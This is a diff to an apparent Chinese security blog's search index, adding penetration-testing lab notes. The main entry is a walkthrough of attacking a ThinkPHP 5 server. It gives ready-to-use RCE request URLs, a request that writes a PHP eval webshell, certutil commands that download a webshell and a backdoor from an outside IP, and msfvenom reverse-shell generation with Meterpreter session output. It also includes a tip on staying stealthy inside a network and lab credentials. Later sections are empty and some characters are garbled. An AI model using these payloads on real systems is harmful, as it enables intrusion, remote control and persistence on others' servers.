@@ -4,6 +4,58 @@
   
     
     <entry>
+      <title>渗透测试靶场三</title>
+      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
+      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%89/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透测试要点</title>
+      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%A6%81%E7%82%B9/"/>
+      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%A6%81%E7%82%B9/</url>
+      
+        <content type="html"><![CDATA[<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ol><li>少用msf17010，动静大，容易把主机打崩，渗透测试尽量要动静小，获取到的主机资产要多，如果直接打崩了就少了个资产。在内网要动静小一点，才能更加的隐蔽</li></ol>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透测试靶场二</title>
+      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
+      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%BA%8C/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透测试靶场一</title>
+      <link href="/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
+      <url>/2022-09-20-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E6%88%98/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
+      
+        <content type="html"><![CDATA[<h1 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">218.76.8.99:2780 --&gt; 10.30.1.181:80</span><br><span class="line">218.76.8.99:2722 --&gt; 10.30.1.105:22</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="section"># 公网</span></span><br><span class="line">Attack-Kali：</span><br><span class="line">218.76.8.99 2722[ssh] root/123456</span><br><span class="line">WEB1<span class="emphasis">_Thinkphp5_</span>Win7</span><br><span class="line">218.76.8.99:2780 --&gt; 10.30.1.181:80</span><br><span class="line">pts 172.26.2.182</span><br><span class="line">pts1 172.26.3.63</span><br><span class="line"></span><br><span class="line"><span class="section"># 内网</span></span><br><span class="line">WEB1<span class="emphasis">_HongCMS_</span>Win7</span><br><span class="line">pts 172.26.2.174</span><br><span class="line">pts1 172.26.3.18</span><br><span class="line">WEB2-Weblogic<span class="emphasis">_RCE</span></span><br><span class="line"><span class="emphasis">pts1 172.26.3.62</span></span><br><span class="line"><span class="emphasis">pts2 172.26.4.66</span></span><br><span class="line"><span class="emphasis">WEB2_</span>Strtus2<span class="emphasis">_Centos</span></span><br><span class="line"><span class="emphasis">172.26.3.75</span></span><br><span class="line"><span class="emphasis">WEB3_</span>Thinkcmf<span class="emphasis">_Win7</span></span><br><span class="line"><span class="emphasis">172.26.4.22</span></span><br></pre></td></tr></table></figure><h1 id="寻找突破点-WEB1-Thinkphp5"><a href="#寻找突破点-WEB1-Thinkphp5" class="headerlink" title="寻找突破点 - WEB1_Thinkphp5"></a>寻找突破点 - WEB1_Thinkphp5</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol><li>Acunetix扫描目标 <a href="http://218.76.8.99:2780/">http://218.76.8.99:2780/</a></li><li>Wappalyzer</li><li>目录扫描</li></ol><blockquote><ul><li>dirsearch</li><li>dirb</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http:��218.76.8.99:2780/ -e *</span><br></pre></td></tr></table></figure><ul><li>御剑目录扫描</li></ul></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><a href="http://218.76.8.99:2780/public/index.php">http://218.76.8.99:2780/public/index.php</a></p></blockquote><ol><li>thinkphp5.1-rce写Webshell</li></ol><ul><li>命令执行</li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=whoami</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=/index/\think\request/cache&amp;key=whoami|system</span><br><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><ul><li>写webshell</li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=m.php&amp;vars[1][]=%3C?php%20@eval($_POST[c]);?%3E</span><br></pre></td></tr></table></figure><ul><li>certutil下载webshell</li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://218.76.8.99:2780/public/index.php?s=index/\think\Request/input&amp;filter=system&amp;data=cmd /c certutil.exe -urlcache -split -f http://139.155.49.43:8000/bx3.php C:/phpStudy/PHPTutorial/WWW/public/bx3.php</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201353158.png" alt="image-20220920135259964"></p><h2 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h2><ol><li>msfvenom生成后门，并上传至靶机，msf开启监听</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msfvenom</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp </span><br><span class="line">lhost=139.155.49.43 lport=5555 -f exe &gt; re5555.exe</span><br><span class="line"># metasploit</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 39.108.68.207</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 10001</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to 39.108.68.207:10001:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:10001</span><br><span class="line">[*] Sending stage (200262 bytes) to 218.76.8.99</span><br><span class="line">[*] Meterpreter session 1 opened (172.18.66.74:10001 �� </span><br><span class="line">218.76.8.99:19931) at 2020-11-28 18:49:40 +0800</span><br><span class="line"># webshell</span><br><span class="line">start re5555.exe</span><br></pre></td></tr></table></figure><ol start="2"><li>thinkphp5.1-rce 写 msf 木马，然后执行上线 msf</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:��218.76.8.99:2780/public/index.php?</span><br><span class="line">s=index/\think\Request/input&amp;filter=system&amp;data=cmd /c </span><br><span class="line">certutil.exe -urlcache -split -f </span><br><span class="line">http:��139.155.49.43:8000/re5555.exe </span><br><span class="line">C:/windows/re5555.exe</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209201353732.png" alt="image-20220920135358516"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:��218.76.8.99:2780/public/index.php?</span><br><span class="line">s=index/\think\Request/input&amp;filter=system&amp;data=c:\windo</span><br><span class="line">ws\re5555.exe</span><br></pre></td></tr></table></figure><h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h1 id="2-x网段渗透-172-26-2-174-win7-HongCMS"><a href="#2-x网段渗透-172-26-2-174-win7-HongCMS" class="headerlink" title="2.x网段渗透 - 172.26.2.174[win7-HongCMS]"></a>2.x网段渗透 - 172.26.2.174[win7-HongCMS]</h1><h2 id="开放80端口"><a href="#开放80端口" class="headerlink" title="开放80端口"></a>开放80端口</h2><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="二层socks代理"><a href="#二层socks代理" class="headerlink" title="二层socks代理"></a>二层socks代理</h2><h2 id="内网存活探测"><a href="#内网存活探测" class="headerlink" title="内网存活探测"></a>内网存活探测</h2><h1 id="3-x网段渗透-172-26-3-75-centos-struts2"><a href="#3-x网段渗透-172-26-3-75-centos-struts2" class="headerlink" title="3.x网段渗透 - 172.26.3.75[centos-struts2]"></a>3.x网段渗透 - 172.26.3.75[centos-struts2]</h1><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="MSF连接上线"><a href="#MSF连接上线" class="headerlink" title="MSF连接上线"></a>MSF连接上线</h2><h2 id="struts2漏洞利用工具"><a href="#struts2漏洞利用工具" class="headerlink" title="struts2漏洞利用工具"></a>struts2漏洞利用工具</h2><h1 id="3-x网段渗透-172-26-3-27-centos-weblogic"><a href="#3-x网段渗透-172-26-3-27-centos-weblogic" class="headerlink" title="3.x网段渗透 - 172.26.3.27[centos-weblogic]"></a>3.x网段渗透 - 172.26.3.27[centos-weblogic]</h1><h2 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="执行后门，msf连接上线"><a href="#执行后门，msf连接上线" class="headerlink" title="执行后门，msf连接上线"></a>执行后门，msf连接上线</h2><h2 id="后渗�"><a href="#后渗�" class="headerlink" title="后渗�"></a>后渗�</h2>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>windows命令行下载文件</title>
       <link href="/2022-09-17-%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/"/>
       <url>/2022-09-17-%E7%9F%A5%E8%AF%86/Windows/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/</url>
